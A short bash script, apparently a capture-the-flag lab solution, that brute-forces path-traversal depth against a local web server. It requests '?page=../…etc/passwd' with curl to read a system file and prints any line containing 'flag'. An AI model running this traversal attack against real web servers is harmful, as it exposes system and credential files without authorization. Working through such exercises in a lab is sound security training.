#!/bin/bash

for depth in $(seq 1 20); do
# Each iteration, depth takes the next value: 1, then 2, then 3, etc.
    payload=$(printf '../%.0s' $(seq 1 $depth))
    response=$(curl -s "http://192.168.64.2/?page=${payload}etc/passwd")
    # Send the HTTP request to the server with our payload.

    if echo "$response" | grep -qi "flag"; then
    # Search the response for the word "flag" (case insensitive).
        echo "FLAG FOUND at depth $depth!"
        echo "$response" | grep -i flag
        # Print every line from the server response that contains "flag".
        break
    elif echo "$response" | grep -qi "almost"; then
        echo "Depth $depth: Almost!"
    elif echo "$response" | grep -qi "nope"; then
        echo "Depth $depth: Nope!"
    else
        echo "Depth $depth: Not here."
    fi
done